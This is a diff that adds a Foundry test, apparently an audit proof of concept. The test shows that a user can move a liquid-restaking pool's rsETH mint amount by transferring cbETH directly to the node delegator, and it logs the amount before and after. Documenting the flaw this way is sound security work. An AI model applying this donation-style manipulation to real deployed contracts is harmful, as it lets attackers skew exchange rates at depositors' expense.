@@ -407,6 +407,47 @@ contract BaseIntegrationTest is BaseTest {
         assertEq(userBalanceBefore - userBalanceAfter, amount, "amount is not same");
     }
 
+    function test_TheRSETHAmountToBeMintedCanBeChangedByAnyoneEasily() public {
+        uint256 amount = 500 ether;
+        uint256 biggerAmount = 10_000 ether;
+
+        // minting tokens to user to make sure he has enough tokens
+        cbETH.mint(alice, 20_000 ether);
+
+        uint256 userBalanceBefore = IERC20(cbETH).balanceOf(alice);
+        (uint256 rsEthMinted) = depositAssetToPool(address(cbETH), amount, alice, 1);
+        uint256 userBalanceAfter = IERC20(cbETH).balanceOf(alice);
+
+        assertEq(userBalanceBefore - userBalanceAfter, amount, "amount is not same");
+
+        // depositing tokens to node delegator. This is neccessary to make this work.
+        // Also it will be very normal that some amount of tokens will remain deposited in the node delegator
+        vm.startPrank(manager);
+        lrtDepositPoolP.transferAssetToNodeDelegator(0, address(cbETH), amount);
+        vm.stopPrank();
+
+        // getting the RSETH amount to be minted for `amount` of tokens
+        // the actual amount minted will be less than `rsEthMintedForAmount` because there is
+        // another bug in the code that will make the amount less than `rsEthMintedForAmount`
+        uint256 rsEthMintedForAmount = lrtDepositPoolP.getRsETHAmountToMint(address(cbETH), amount);
+
+        console2.log("> Getting RSETH Amount to be Minted After the token deposit through `depositAsset(...)`:");
+        console2.log("\tAmount To Deposit: %s", amount);
+        console2.log("\tAmount of RSETH Tokens to Recieve: %s\n", rsEthMintedForAmount);
+
+        // alice transfer tokens directly to node delegator without going through the deposit pool
+        vm.startPrank(alice);
+        IERC20(cbETH).transfer(address(nodeDelP), amount);
+        vm.stopPrank();
+
+        // again fetching the RSETH amount to be minted for `amount` of tokens
+        rsEthMintedForAmount = lrtDepositPoolP.getRsETHAmountToMint(address(cbETH), amount);
+
+        console2.log("> Getting RSETH Amount to be Minted After the direct token deposit of %s amount:", amount);
+        console2.log("\tAmount To Deposit: %s", amount);
+        console2.log("\tAmount of RSETH Tokens to Recieve: %s", rsEthMintedForAmount);
+    }
+
     function depositAssetToPool(
         address asset,
         uint256 amount,
